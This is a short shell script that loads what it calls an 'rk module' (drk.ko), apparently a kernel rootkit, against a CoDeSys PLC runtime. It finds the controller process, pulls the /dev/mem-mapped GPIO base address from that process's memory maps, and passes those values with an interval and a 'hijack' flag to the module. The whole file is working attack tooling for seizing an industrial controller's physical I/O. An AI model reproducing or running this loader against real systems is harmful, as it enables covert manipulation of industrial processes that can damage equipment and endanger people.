#!/bin/sh
 if [ $# -ne 2 ]
 then
	echo "Usage:"
	echo "\t./loader.sh [interval] [hijack]"
	echo "Example: "
	echo "\t ./loader.sh 100 1"
	exit
 else
	if [ "$1" -gt "4000" ]
	then
		echo "interval must be < 4000"
		exit
	else
		bInterval=$1
		cHijack=$2
	fi
 fi

 cspid=`pidof codesyscontrol.bin | cut -d' ' -f 1`
 gpiobase=`cat /proc/$cspid/maps | grep /dev/mem | cut -d'-' -f 1 | cut -d' ' -f 1`
 linver=`uname -r`

 echo " [*] Preparing..."
 echo "\t[+] Kernel version: $linver"
 if pgrep "codesys" > /dev/null
 then
        echo "\t[+] Looking for PLC Process... CoDeSys Detected"
 else
        echo "\t[-] Looking for PLC Process... FAILED!"
 fi

 echo "\t[+] CoDeSys control PID: $cspid"
 echo "\t[+] GPIO is mapped at: $gpiobase"
 echo "\t[+] GPIO in long: $((0x${gpiobase}))"
 echo "\t[+] GPIO SET Register: $((0x$gpiobase + 0x1C))"

 insmod drk.ko ppid=$cspid gpioB=0x$gpiobase interval=$bInterval hijack=$cHijack
 if [ $? = 0 ]
 then
        echo "\t[+] Loading rk module... Done"
 else
        echo "\t[+] Loading rk module... FAILED!"
 fi
echo " [*] Done."
